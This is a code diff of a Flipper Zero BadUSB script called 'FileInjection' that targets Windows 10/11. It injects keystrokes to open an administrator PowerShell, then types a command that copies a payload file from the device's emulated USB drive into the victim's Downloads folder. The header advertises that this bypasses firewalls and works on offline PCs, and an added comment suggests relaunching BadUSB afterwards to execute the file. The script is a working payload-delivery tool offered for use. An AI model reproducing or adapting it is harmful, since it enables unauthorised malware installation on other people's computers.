@@ -12,13 +12,16 @@
 // #                                                                                      |
 // #     Title        : FileInjection                                                     |
 // #     Link         : https://github.com/miiraak/                                       |
-// #     Version      : 2.0                                                               |
+// #     Version      : 2.5                                                               |
 // #     Category     : Others                                                            |
 // #     Target       : Windows 10/11                                                     |
 // #     Description  : Copie un payload.ps1 vers le PC, evitant utilisation de dropbox.  |
 // #                    Permet de bypass les firewall, marche sur les pc offline.         |
 // #                                                                                      |
 // ########################################################################################
+
+// You need to create a .img in mass storage app named Infiltration (or modify the line 27)
+// You need to change the line 50 with the name of your file.
 
 print("__Activation des modules__")
 // you can change this with your .img name (if not, create mass storage .img named Infliltration)
@@ -44,18 +47,15 @@ badusb.press("GUI", "x");
 delay(300);
 badusb.press("i");
 delay(3000);
-badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Copy-Item -Path ${DriveLetter}:/payload.ps1 -Destination C:/Users/$env:username/Downloads; exit;");
+badusb.println("Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Copy-Item -Path ${DriveLetter}:/YOUR_FILE.loo -Destination C:/Users/$env:username/Downloads; exit;");
 badusb.quit();
 
 delay(2000);
 usbdisk.start(stockage);
 
 print("Attendez la fermeture du Terminal...");
-
-while (!usbdisk.wasEjected()) {
-    delay(1000);
-}
-
 print("Done");
+
 usbdisk.stop();
 
+// Here you can restart the badusb to execute your file or do more task.
